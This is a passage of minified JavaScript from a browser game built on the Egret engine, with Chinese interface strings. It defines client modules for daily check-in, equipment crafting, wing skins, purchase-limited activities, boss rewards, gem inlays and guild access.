t>this.loginTimes?r.notYet:t<this.loginTimes?r.hasChecked:this.todayReward?r.hasChecked:r.canCheck},e.prototype.getRewardList=function(t){return s.GlobalConfig.MonthSignDaysConfig[t]?s.GlobalConfig.MonthSignDaysConfig[t]:null},__decorate([post()],e.prototype,"postCheckInData",null),__decorate([post()],e.prototype,"postCheckIn",null),__decorate([post()],e.prototype,"postComplement",null),e}(n.BaseSystem);e.DailyCheckIn=a,window.DailyCheckIn=a,__reflect(a.prototype,"DailyCheckIn",[]),Systemap.DailyCheckIn=function(){return a.ins()};var r;!function(t){t[t.notYet=0]="notYet",t[t.canCheck=1]="canCheck",t[t.hasChecked=2]="hasChecked"}(r=e.DailyCheckInState||(e.DailyCheckInState={})),window.DailyCheckInState=r,window.DailyCheckIn=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GodWingChangePanel=void 0;var n=i(55),o=i(1),s=i(0),a=i(39),r=i(6),l=i(99),h=i(2),u=i(426),p=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.wingDataArr=[],e.slot=0,e._sn_="ShenYuEquipChangeSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){observe(this,this.initList,r.BagCT.ins().postgCbMerge)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.slot=t[0],this.skillList.itemRenderer=u.GodWingChangeItem,this.skillListArr=new eui.ArrayCollection([]),this.skillList.dataProvider=this.skillListArr,this.addTouchEvent(this.btnCompose,this.onClick),this.initList()
},e.prototype.removeDisplay=function(){if(this.skin){if(this.removeObserve(),this.skillList&&this.skillList.numElements>0)for(var t=0;t<this.skillList.numElements;t++){var e=this.skillList.getElementAt(t);e&&e.ClearObj()}this.skillListArr&&this.skillListArr.replaceAll(null),this.skillList&&(this.skillList.dataProvider=null)}},e.prototype.onClick=function(t){switch(t.target){case this.btnCompose:for(var e=void 0,i=0;i<this.wingDataArr.length;i++)if(e=l.WingCC.getGodWingComposeTarget(this.wingDataArr[i].item.itemConfig.id))return win.open("ComposeTip",e.itemId),void win.close(this);var n=l.WingCC.getStartGodWing(this.slot);n?(win.open("ComposeTip",n.itemId),win.close(this)):h.TipsCT.ins().showTips(gettext("没有可以合成的神羽"))}},e.prototype.sortFun=function(t,e){return n.Algorithm.sortDesc(t.item.itemConfig.id,e.item.itemConfig.id)},e.prototype.initList=function(){this.wingDataArr=[];for(var t=r.BagCT.ins().getBagGoodsByType(a.ItemType.TYPE_16),e=l.WingCC.getBestGodWingLevel(0,this.slot),i=0;i<t.length;i++){var n=s.GlobalConfig.GodWingItemConfig[t[i].configID];n.slot==this.slot&&this.wingDataArr.push({item:t[i],isBest:n.level==e})}this.wingDataArr.sort(this.sortFun),this.skillListArr.replaceAll(this.wingDataArr)},e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];return!0},e}(o.BaseView);e.GodWingChangePanel=p,window.GodWingChangePanel=p,__reflect(p.prototype,"GodWingChangePanel",[]),window.GodWingChangePanel=p},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.MasterEquipWin=void 0;var n=i(24),o=i(1),s=i(22),a=i(0),r=i(13),l=i(6),h=i(10),u=i(118),p=i(260),d=i(474),c=i(70),f=i(21),g=i(2),m=i(12),v=i(15),y=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.currRoleId=0,e.materialArr=[],e.mainPasArr=[],e.subPasArr=[],e.bolPlayingEft=!1,e._sn_="MasterEquipSkin",e.gridMcArr=[],e.dirMcArr=[],e}return __extends(e,t),e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=m.OpenSystem.ins().checkSysOpen(v.SystemType.MasterEquip);return i||g.TipsCT.ins().showTips(m.OpenSystem.ins().getNoOpenTips(v.SystemType.MasterEquip)),i},e.prototype.skinComplete=function(){this.congra.visible=!1,this.bolPlayingEft=!1,this.materialArr=[];for(var t=0;5>t;t++)this.materialArr[t]=this["material"+t];this.mainPasArr=[];for(var t=1;7>t;t++){var e={grp:this["mainGrp"+t],img:this["main"+t],txt:this["maintext"+t]};this.mainPasArr.push(e),this.addTouchEvent(e.grp,this.onSkillClick)}this.subPasArr=[];for(var t=1;4>t;t++){var e={grp:this["subGrp"+t],img:this["sub"+t],txt:this["subtext"+t]};this.subPasArr.push(e),this.addTouchEvent(e.grp,this.onSkillClick)}this.product.destruct(),this["final"].destruct(),this.progressBar0.slideDuration=0,this.addTouchEvent(this.product,this.onItemClick),this.addTouchEvent(this.btn_compose,this.onClick),this.addTouchEvent(this.define,this.onClick),this.addTouchEvent(this.btnHelp,this.onClick),observe(this,this.onComResult,u.MasterEquipCT.ins().postMasterEquipComResult),observe(this,this.updateProgress,u.MasterEquipCT.ins().postMasterEquipPm)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=t[0];this.masterCfg=a.GlobalConfig.MasterSuitEquipConfig[i],this.updateView()},e.prototype.updateRedpoint=function(){},e.prototype.onItemClick=function(t){t.preventDefault(),this.product.data&&!this.bolPlayingEft&&win.open(d.MasterEquipChangeWin,this.product.data.id)},e.prototype.onClick=function(t){var e;if(!this.bolPlayingEft)switch(t.currentTarget){case this.btn_compose:if(0==u.MasterEquipCT.ins().canCompose(this.masterCfg.target.id,!0))return;u.MasterEquipCT.ins().sendMasterEquipCompose(this.masterCfg.target.id);break;case this.define:this.congra.visible=!1;break;case this.btnHelp:win.open("CommonHelpWin",null===(e=a.GlobalConfig.HelpInfoConfig[331])||void 0===e?void 0:e.text)}},e.prototype.onSkillClick=function(t){if(!this.bolPlayingEft){var e=Number(t.currentTarget.name);e&&win.open(p.MasterEquipTips,e)}},e.prototype.setRoleId=function(t){this.currRoleId=t,this.updateView()},e.prototype.updateView=function(t){if(void 0===t&&(t=0),t&&(this.masterCfg=a.GlobalConfig.MasterSuitEquipConfig[t]),this.masterCfg){this.updateRedpoint();var e=r.SubRoles.ins().getSubRoleByIndex(this.currRoleId);if(e){this.product.data=this.masterCfg.target,this.productname.source=this.masterCfg.productname;var i=this.masterCfg["attr_"+e.job];if(i)for(var n=0;3>n;n++){var o=i[n];o?(this["attr"+n].visible=!0,this["name"+n].text=s.AttributeData.getAttrStrByTypeTotem(o.id)+": ",this["minvalue"+n].text=s.AttributeData.getAttrValStrByType(o.id,o.min),this["maxvalue"+n].text=s.AttributeData.getAttrValStrByType(o.id,o.max)):this["attr"+n].visible=!1}else for(var n=0;3>n;n++)this["attr"+n].visible=!1;this.updateProgress(),this.updateCost(),this.updatePasSkill()}}},e.prototype.updateCost=function(){this.product.data=this.masterCfg.target;for(var t,e=0,i=0;i<this.masterCfg.cost.length;i++)if(this.masterCfg.cost[i]&&0==this.masterCfg.cost[i].type)t=this.masterCfg.cost[i];else{var n=this.materialArr[e];if(n){n.data=this.masterCfg.cost[i];var o=a.GlobalConfig.ItemConfig[this.masterCfg.cost[i].id];n.setName(o.name+"\n"+this.getCostStr(this.masterCfg.cost[i])),e++}}t&&t.count?(this.cost.visible=!0,this.cost.setData(t)):this.cost.visible=!1},e.prototype.getCostStr=function(t){if(!t)return"";var e=l.BagCT.ins().getBagGoodsCountById(l.BagCT.BAG_TYPE_OTHTER,t.id),i=e>=t.count?4587386:16720161,o="|C:"+i+"&T:"+n.CommonUtils.overLength(e)+"/"+n.CommonUtils.overLength(t.count);return o},e.prototype.updatePasSkill=function(){for(var t=a.GlobalConfig.ItemConfig[this.masterCfg.target.id],e=h.ItemUtil.getSubType(t),i=u.MasterEquipCT.ins().getMasterSuitEquipEntry(e),n=0,o=0;o<this.mainPasArr.length;o++)this.mainPasArr[o].img.source=i[n].icon+"_png",this.mainPasArr[o].grp.name=i[n].id.toString(),this.mainPasArr[o].txt.text="",n++;for(var o=0;o<this.subPasArr.length;o++)this.subPasArr[o].img.source=i[n].icon+"_png",this.subPasArr[o].grp.name=i[n].id.toString(),this.subPasArr[o].txt.text="",n++},e.prototype.updateProgress=function(){var t=100,e=r.SubRoles.ins().getSubRoleByIndex(this.currRoleId),i=this.masterCfg["attr_"+e.job];if(i)for(var n=0,o=i;n<o.length;n++){var s=o[n];t=s.pm;break}this.progressBar0.maximum=t,this.progressBar0.value=u.MasterEquipCT.ins().masterEquipPm},e.prototype.onComResult=function(t){this.updateView(),t&&this.playSuccessEft()},e.prototype.playSuccessEft=function(){if(!this.bolPlayingEft){this.bolPlayingEft=!0;var t=this.material1.parent;if(!this.gridMcArr.length)for(var e=0;e<this.materialArr.length;e++){var i=new f.MovieClip;i.playFile(RES_DIR_EFF+"master_small",1),i.x=this.materialArr[e].x+this.materialArr[e].width/2,i.y=this.materialArr[e].y+this.materialArr[e].height/2,t.addChild(i),this.gridMcArr.push(i)}Timer.start(600,1,this.playDirEft,this)}},e.prototype.playDirEft=function(){var t=this.material1.parent;if(!this.dirMcArr.length)for(var e=0;e<this.materialArr.length;e++){var i=new f.MovieClip;i.playFile(RES_DIR_EFF+"master_move",1),i.x=this.materialArr[e].x+this.materialArr[e].width/2,i.y=this.materialArr[e].y+this.materialArr[e].height/2,t.addChild(i),this.dirMcArr.push(i),i.anchorOffsetX=85}for(var n={x:this.product.x+this.product.width/2,y:this.product.y+this.product.height/2},o=0,s=this.dirMcArr;o<s.length;o++){var i=s[o],a=c.MathUtils.getRadian2(i.x,i.y,n.x,n.y),r=c.MathUtils.getAngle(a);i.rotation=r;var l=egret.Tween.get(i);l.to({x:n.x,y:n.y},400)}Timer.start(700,1,this.playProEft,this),Timer.start(1200,1,this.eftCallBackFun,this)},e.prototype.playProEft=function(){this.proMc&&(removeFromParent(this.proMc),this.proMc=null);var t=this.material1.parent;this.proMc=new f.MovieClip,this.proMc.playFile(RES_DIR_EFF+"master_big",1),this.proMc.x=this.product.x+this.product.width/2,this.proMc.y=this.product.y+this.product.height/2,t.addChild(this.proMc)},e.prototype.clearEftMc=function(){for(var t=0,e=this.gridMcArr;t<e.length;t++){var i=e[t];removeFromParent(i)}this.gridMcArr.length=0;for(var n=0,o=this.dirMcArr;n<o.length;n++){var s=o[n];egret.Tween.removeTweens(s),removeFromParent(s)}this.dirMcArr.length=0,this.bolPlayingEft=!1},e.prototype.eftCallBackFun=function(){this.clearEftMc(),this.congra.visible=!0,this["final"].data=this.masterCfg.target.id},e.prototype.removeDisplay=function(){this.skin&&(Timer.stop(this.playDirEft,this),Timer.stop(this.playProEft,this),Timer.stop(this.eftCallBackFun,this),this.clearEftMc())},__decorate([delayCall()],e.prototype,"updateRedpoint",null),__decorate([delayCall()],e.prototype,"updateView",null),__decorate([delayCall()],e.prototype,"updateCost",null),e}(o.BaseView);e.MasterEquipWin=y,window.MasterEquipWin=y,__reflect(y.prototype,"MasterEquipWin",[]),window.MasterEquipWin=y},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.EquipClearItem=void 0;var n=i(3),o=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.createChildren=function(){this.width=72,this.iconDisplay&&(this.iconDisplay.width=72)},e.prototype.skinComplete=function(){this.iconDisplay&&(this.iconDisplay.width=72)},e}(n.BaseItemRender);e.EquipClearItem=o,window.EquipClearItem=o,__reflect(o.prototype,"EquipClearItem",[]),window.EquipClearItem=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ActivityType2Data=void 0;var n=i(33),o=i(4),s=i(9),a=i(0),r=i(2),l=function(t){function e(e,i){var n=t.call(this,e,i)||this;return n.buyData=[],n.serverBuyData=[],n.areaBuyData=[],n.areabuyReward=[],n.initBuyData(e),n}return __extends(e,t),e.prototype.update=function(i){t.prototype.update.call(this,i);var n=i.readShort(),o=i.readInt();this.buyData[n]=o,this.serverBuyData[n]=i.readInt(),this.areaBuyData[n]=i.readInt(),this.areabuyReward[n]=i.readInt(),this.areaBuyData[n]=Math.max(this.areaBuyData[n],this.serverBuyData[n]),e.postRewardSuatus()},e.postRewardSuatus=function(){},e.prototype.initBuyData=function(t){for(var e=t.readShort(),i=1;e>=i;i++)this.buyData[i]=t.readShort(),this.serverBuyData[i]=t.readShort(),this.areaBuyData[i]=t.readInt(),this.areabuyReward[i]=t.readInt();for(var n=0;e>=n;n++)this.areaBuyData[n]=Math.max(this.areaBuyData[n],this.serverBuyData[n]);this.sumRMB=t.readInt()},e.prototype.getBuyCntByIndex=function(t){var e=this.buyData[t]||0;return e},e.prototype.checkCanSel=function(t){var e=a.GlobalConfig.ActivityType2Config[this.id][t];if(!e)return!1;if(e.union>0){var i=a.GlobalConfig.ActivityType2Config[this.id][t-1];if(!i)return!1;var n=this.buyData[i.index]||0;if(n<i.count)return r.TipsCT.ins().showTips(gettext("该档商品还没解锁")),!1}return!0},e.prototype.checkCanBuy=function(t,e){void 0===e&&(e=!1);var i=a.GlobalConfig.ActivityType2Config[this.id][t];if(!i)return{errCode:0,canBuy:!1};var n=this.buyData[t]||0,o=i.count;if(n>=o)return e&&r.TipsCT.ins().showTips(gettext("没有购买次数了")),{errCode:1,canBuy:!1};if(i.union>0){var s=a.GlobalConfig.ActivityType2Config[this.id][t-1];if(!s)return{errCode:0,canBuy:!1};var l=this.buyData[s.index]||0;return l<s.count?(e&&r.TipsCT.ins().showTips(gettext("该档商品还没解锁")),{errCode:2,canBuy:!1}):o>n?{errCode:0,canBuy:!0}:(e&&r.TipsCT.ins().showTips(gettext("没有购买次数了")),{errCode:1,canBuy:!1})}return o>n?{errCode:0,canBuy:!0}:(e&&r.TipsCT.ins().showTips(gettext("没有购买次数了")),{errCode:1,canBuy:!1})},e.prototype.canReward=function(){if(o.ActorCC.level<e.LimitLevel)return!1;var t=s.Activity.ins().getActivityDataById(this.id),i=a.GlobalConfig.ActivityType2Config[this.id],n=!1;for(var r in i){var l=i[r],h=t.buyData[l.index]>=l.count?!0:!1;if(n=this.serverBuyData[l.index]>=l.scount?!0:!1,7==l.showType&&!h)return!0;if(!h&&t.sumRMB>=l.needRecharge&&o.ActorCC.yb>=l.price&&o.ActorCC.vip>=l.vip&&!n)return!0;if(h&&l.countReward)for(var u in l.countReward)if(this.getAreaReward(l.index,Number(u)+1))return!0}return!1},e.prototype.getAreaReward=function(t,e){var i=a.GlobalConfig.ActivityType2Config[this.id][t];if(this.buyData[t]&&this.buyData[t]>=i.count){if((this.areabuyReward[t]>>e&1)>0)return s.Activity.Geted;if(this.areaBuyData[t]>=i.countReward[e-1].count)return s.Activity.CanGet}return s.Activity.NotReached},e.LimitLevel=50,__decorate([post()],e,"postRewardSuatus",null),e}(n.ActivityBaseData);e.ActivityType2Data=l,window.ActivityType2Data=l,__reflect(l.prototype,"ActivityType2Data",[]),window.ActivityType2Data=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ActivityType4Data=void 0;var n=i(0),o=i(7),s=i(8),a=i(33),r=function(t){function e(e){return t.call(this,e)||this}return __extends(e,t),e.prototype.update=function(e){t.prototype.update.call(this,e)},e.prototype.updateData=function(t){},e.prototype.isOpenActivity=function(){var t=Math.floor((s.DateUtils.formatMiniDateTime(this.startTime)-o.GameServerCC.serverTime)/1e3),e=Math.floor((s.DateUtils.formatMiniDateTime(this.endTime)-o.GameServerCC.serverTime)/1e3);return 0>t&&e>0?!0:!1},e.prototype.getCostRank=function(t,e){if(!t)return 0;for(var i=0,o=t.numType,s=n.GlobalConfig.ActivityType4Config[this.id];s[e.idx];){if(o>=s[e.idx].value){i=s[e.idx].ranking,e.idx++;break}e.idx++}return i},e.prototype.getLeftTime=function(){if(this.endTime){var t=Math.floor((s.DateUtils.formatMiniDateTime(this.endTime)-o.GameServerCC.serverTime)/1e3);return 0>t&&(t=0),t}return 0},e.getTypeDesc=function(t){return n.GlobalConfig.ActivityType4Config[t][0].tarName},e.getTarStr=function(t,e){var i;switch(e||(e=t.value),t.rankType){default:i={lv:e,star:e,stage:e,power:e}}return this.getStr(i,t.Id)},e.getStr=function(t,e){if(!t)return"";var i=t.lv,o=t.star,s=t.stage,a=t.power,r=n.GlobalConfig.ActivityType4Config[e][0].unit;return r?r.replace("lv",i+"").replace("stage",s+"").replace("star",o+"").replace("power",a+""):""},e}(a.ActivityBaseData);e.ActivityType4Data=r,window.ActivityType4Data=r,__reflect(r.prototype,"ActivityType4Data",[]),window.ActivityType4Data=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ActivityType57Data=void 0;var n=i(0),o=i(4),s=i(33),a=i(17),r=i(9),l=function(t){function e(i,n){var o=t.call(this,i,n)||this;return o.bossData={},o.rewardData={},o.update(i),e.actId=n,o.initRps(),o}return __extends(e,t),e.prototype.initRps=function(){var t=this;this.rp=new a.RedPoint(function(){if(!t.isOpenActivity())return!1;var e=n.GlobalConfig.ActivityType57Config[t.id];if(!e)return!1;var i,o=[];for(var s in e)i=e[s],o.indexOf(i.groupType)<0&&o.push(i.groupType);for(var a=0;a<o.length;a++)for(var r in e)if(e[r].groupType==o[a]&&t.checkAward(e[r].groupType,e[r].bossId))return!0;return!1},r.Activity.ins().postRewardResult,r.Activity.ins().postChangePage,r.Activity.ins().postActivityIsGetAwards)},e.prototype.update=function(t){for(var e=n.GlobalConfig.ActivityType57Config[this.id],i=t.readShort(),o=0;i>o;o++){var s=t.readInt(),a=e[s],r={bossId:s,playerId:t.readInt(),player:t.readString()};this.bossData[a.groupType]||(this.bossData[a.groupType]=[]),this.bossData[a.groupType].push(r)}for(var l=t.readShort(),h=0;l>h;h++){var s=t.readInt(),a=e[s],r={bossId:s,belong:t.readByte(),all:t.readByte(),person:t.readByte()};this.rewardData[a.groupType]||(this.rewardData[a.groupType]=[]),this.rewardData[a.groupType].push(r)}},e.prototype.setCfgDic=function(){this._cfgDic={};var t,e=n.GlobalConfig.ActivityType57Config[this.id];for(var i in e)t=e[i],this._cfgDic[t.groupType]||(this._cfgDic[t.groupType]=[]),this._cfgDic[t.groupType].push(t)},e.prototype.getBossCfgArrByGroup=function(t){return this._cfgDic||this.setCfgDic(),this._cfgDic&&this._cfgDic[t]?this._cfgDic[t]:[]},e.prototype.getBossCfgByGroupId=function(t,e){this._cfgDic||this.setCfgDic();var i=this._cfgDic[t];for(var n in i)if(i[n].bossId==e)return i[n];return null},e.prototype.canReward=function(){for(var t in this.rewardData)if(this.checkTypeAward(+t))return!0;return!1},e.prototype.checkTypeAward=function(t){var e;for(var i in this.rewardData[t])if(e=this.rewardData[t][i],this.checkAward(t,e.bossId))return!0;return!1},e.prototype.checkAward=function(t,e){var i=this.getBossCfgByGroupId(t,e);if(!i||o.ActorCC.level<i.level)return!1;var n=this.getAwardDataByGroupId(t,e);return n?1==n.belong||1==n.person||1==n.all:!1},e.prototype.getAwardDataByGroupId=function(t,e){var i=this.rewardData[t];if(!i)return null;for(var n in i)if(i[n].bossId==e)return i[n];return null},e.prototype.getBossInfoByTypeId=function(t,e){var i=this.bossData[t];if(!i)return null;for(var n in i)if(i[n].bossId==e)return i[n];return null},e.prototype.checkGetAward=function(t,e){var i=this.getAwardDataByGroupId(t,e);return 2==i.belong&&2==i.all&&2==i.person},e.prototype.checkBossIsKilledByMe=function(t,e){var i=this.getAwardDataByGroupId(t,e);return i?0!=i.all||0!=i.belong||0!=i.person:!1},e.prototype.checkBossHasFirstBlood=function(t,e){var i=this.getBossInfoByTypeId(t,e);return i?{flag:i.playerId>0,name:i.player}:null},e.prototype.checkBossIsMyFirstBlood=function(t,e){var i=this.getBossInfoByTypeId(t,e);return i?i.playerId==o.ActorCC.actorID:!1},e.selType=-1,e.selBossId=-1,e.actId=-1,e}(s.ActivityBaseData);e.ActivityType57Data=l,window.ActivityType57Data=l,__reflect(l.prototype,"ActivityType57Data",[]),window.ActivityType57Data=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ChatDataBase=void 0;var n=function(){function t(){}return t}();e.ChatDataBase=n,window.ChatDataBase=n,__reflect(n.prototype,"ChatDataBase",[]),window.ChatDataBase=n},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.TreasureData=void 0;var n=function(){function t(){}return t}();e.TreasureData=n,window.TreasureData=n,__reflect(n.prototype,"TreasureData",[]),window.TreasureData=n},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.EquipInlayData=void 0;var n=i(57),o=i(40),s=function(){function t(){this.pos=0,this.isLock=!0,this.itemData=null}return t.prototype.parser=function(t){var e=t.readInt(),i=new o.ItemData;i.parser(t),this.setGemLock(e),this.updateItemData(i)},t.prototype.setGemPosition=function(t){this.pos=t},t.prototype.setGemLock=function(t){this.isLock=0==t},t.prototype.updateItemData=function(t){this.itemData=t},t.prototype.getPfId=function(){var t;return(null===(t=this.itemData)||void 0===t?void 0:t.getPrefixId())||0},Object.defineProperty(t.prototype,"statue",{get:function(){return this.isLock?n.GEM_STATUS.UnLOCK:this.itemData&&0!=this.itemData.handle?n.GEM_STATUS.Inlaid:n.GEM_STATUS.UnInlaid},enumerable:!1,configurable:!0}),t}();e.EquipInlayData=s,window.EquipInlayData=s,__reflect(s.prototype,"EquipInlayData",[]),window.EquipInlayData=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.EquipInlaySuitData=void 0;var n=i(0),o=i(13),s=i(104),a=function(){function t(t){this.id=t}return t.prototype.isHasSuit=function(){var t=n.GlobalConfig.GemSuitConfig[this.id];return t?!0:!1},t.prototype.getSuitIds=function(){var t;if(this.role)var e=this.role.job;else e=(null===(t=o.SubRoles.ins().getSubRoleByIndex(0))||void 0===t?void 0:t.job)||1;return n.GlobalConfig.GemSuitConfig[this.id]["suit_"+e]||[]},Object.defineProperty(t.prototype,"suitId",{get:function(){if(!this.isHasSuit())return-1;var t=this.getSuitIds()||[],e=this.suitLv;if(0==e)return t[0];var i=e-1;return t[i]},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"suitLv",{get:function(){if(this.role)var t=this.role.equipsData[this.id].gemDatas;else t=s.EquipInlayCT.ins().getPosGemDatas(this.id);for(var e=-1,i=0;i<t.length;i++){var n=t[i],o=n.itemData,a=(null===o||void 0===o?void 0:o.getGemLv())||0;(-1==e||e>a)&&(e=a)}return-1==e&&(e=0),e},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"suitName",{get:function(){var t;if(this.isHasSuit()){if(this.role)var e=this.role.job;else e=null===(t=o.SubRoles.ins().getSubRoleByIndex(0))||void 0===t?void 0:t.job;return n.GlobalConfig.GemSuitConfig[this.id]["skill_"+e]}},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"suitSkillName",{get:function(){var t;if(this.isHasSuit()){if(this.role)var e=this.role.job;else e=null===(t=o.SubRoles.ins().getSubRoleByIndex(0))||void 0===t?void 0:t.job;return n.GlobalConfig.GemSuitConfig[this.id]["skillSuit_"+e]}},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"suitDes",{get:function(){if(!this.isHasSuit())return"";var t=this.suitId;return-1==t?"":n.GlobalConfig.GemReviseConfig[t].desc},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"suitIcon",{get:function(){if(!this.isHasSuit())return"";var t=this.suitLv;0==t&&(t=1);var e=this.getSuitIds(),i=t-1,o=e[i];return n.GlobalConfig.GemReviseConfig[o].icon},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"maxLv",{get:function(){return this.getSuitIds().length},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"isMax",{get:function(){return this.suitLv>=this.maxLv},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"isActed",{get:function(){return this.suitLv>0},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"roleData",{set:function(t){this.role=t},enumerable:!1,configurable:!0}),t}();e.EquipInlaySuitData=a,window.EquipInlaySuitData=a,__reflect(a.prototype,"EquipInlaySuitData",[]),window.EquipInlaySuitData=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GConst=void 0;var n=function(){function t(){}return t.DoubleItem=[102009,102010,102011],t.Types={Number:"number",String:"string",Object:typeof{},Boolean:typeof!0,Function:"function",Arguments:"arguments",Array:"array",Undefined:"undefined",Null:"null",TEST:"test"},t}();e.GConst=n,window.GConst=n,__reflect(n.prototype,"GConst",[]),window.GConst=n},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ResultManager=void 0;var n=i(32),o=i(92),s=i(27),a=i(50),r=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.create=function(t){for(var e=[],a=1;a<arguments.length;a++)e[a-1]=arguments[a];return __awaiter(this,void 0,void 0,function(){var a,r;return __generator(this,function(l){switch(l.label){case 0:return t?(r=t,[3,3]):[3,1];case 1:return[4,Promise.resolve().then(function(){return i(20)})];case 2:r=l.sent().GameMap.fbType,l.label=3;case 3:switch(a=r){case n.FbCT.FB_TYPE_9:console.error(14),e[0]?s.WarnWin.show2(gettext("恭喜挑战成功\n点击继续可前往下一层挑战?"),function(){o.SkyLevelModel.ins().go()},this,function(){send(Ts.exitFB)},this,5,gettext("秒后自动前往"),"",gettext("退出"),gettext("继续挑战")):win.open.apply(win,__spreadArrays(["LadderResultWin"],e));break;case n.FbCT.FB_TYPE_HEGEMONY:win.open.apply(win,__spreadArrays(["HSPVPResultWin"],e));break;default:win.open.apply(win,__spreadArrays(["LadderResultWin"],e))}return[2]}})})},e}(a.BaseClass);e.ResultManager=r,window.ResultManager=r,__reflect(r.prototype,"ResultManager",[]),window.ResultManager=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.TabBarItemRender=void 0;var n=i(3),o=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.skinComplete=function(){this.eRp.visible=!1},e.prototype.dataChanged=function(){var e,i;if(t.prototype.dataChanged.call(this),this.parent instanceof eui.TabBar&&this.parent.dataProvider instanceof eui.ViewStack){var n=this.parent.dataProvider.getElementAt(this.itemIndex);this.eRp.visible=null===(e=null===n||void 0===n?void 0:n.tabRp)||void 0===e?void 0:e.call(n),this.bg&&(this.bg.source=(null===n||void 0===n?void 0:n.tabImg)||""),null===(i=null===n||void 0===n?void 0:n.tabRpBind)||void 0===i?void 0:i.call(n,this),this.updateRp()}},e.prototype.updateRp=function(){var t;if(this.parent.dataProvider instanceof eui.ViewStack){var e=this.parent.dataProvider.getElementAt(this.itemIndex),i=null===(t=null===e||void 0===e?void 0:e.tabRp)||void 0===t?void 0:t.call(e);this.eRp.visible=i}},e.prototype.selectChange=function(){if(this.parent instanceof eui.TabBar&&this.parent.dataProvider instanceof eui.ViewStack){var t=this.parent.dataProvider.getElementAt(this.itemIndex);this.bg&&t&&(this.bg.source=this.selected?t.tabImg+"1":t.tabImg)}},e}(n.BaseItemRender);e.TabBarItemRender=o,window.TabBarItemRender=o,__reflect(o.prototype,"TabBarItemRender",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GuildListInfo=void 0;var n=function(){function t(){}return t}();e.GuildListInfo=n,window.GuildListInfo=n,__reflect(n.prototype,"GuildListInfo",[]),window.GuildListInfo=n},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.PFVipCT=void 0;var n=i(14),o=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.parserPFVipInfo=function(t){for(var e=t.readUnsignedShort(),i={},n=0;e>n;n++){var o={appId:t.readInt(),pfVip:t.readByte(),pfVipSuper:t.readByte(),pfVipYear:t.readByte(),pfLv:t.readInt()};i[o.appId]=o}return i},e}(n.BaseSystem);e.PFVipCT=o,window.PFVipCT=o,__reflect(o.prototype,"PFVipCT",[]),Systemap.PFVipCT=function(){return o.ins()},window.PFVipCT=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GuildMap=void 0;var n=i(8),o=i(1),s=i(17),a=i(0),r=i(15),l=i(4),h=i(51),u=i(215),p=i(67),d=i(12),c=i(7),f=i(94),g=i(183),m=i(2),v=i(159),y=i(107),C=i(28),T=i(147),b=i(216),w=i(641),I=i(5),_=i(59),S=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.soulTimes=0,e}return __extends(e,t),e.prototype.skinComplete=function(){b.GuildStore.ins().sendInfo(),C.Guild.ins().sendMyGuildInfo(),C.Guild.ins().sendConCount(),this.list.itemRenderer=w.GuildMapMemberItemRender},e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];return l.ActorCC.level<a.GlobalConfig.GuildConfig.openLevel?(m.TipsCT.ins().showTips(gettext("{0}级开启",a.GlobalConfig.GuildConfig.openLevel)),_.GameFlashSaleCt.ins().reportLvNot(),win.open(p.View_BianQiang,2),!1):C.Guild.ins().guildID?!0:(win.open("GuildApplyWin"),!1)},e.prototype.addDisplay=function(){for(var 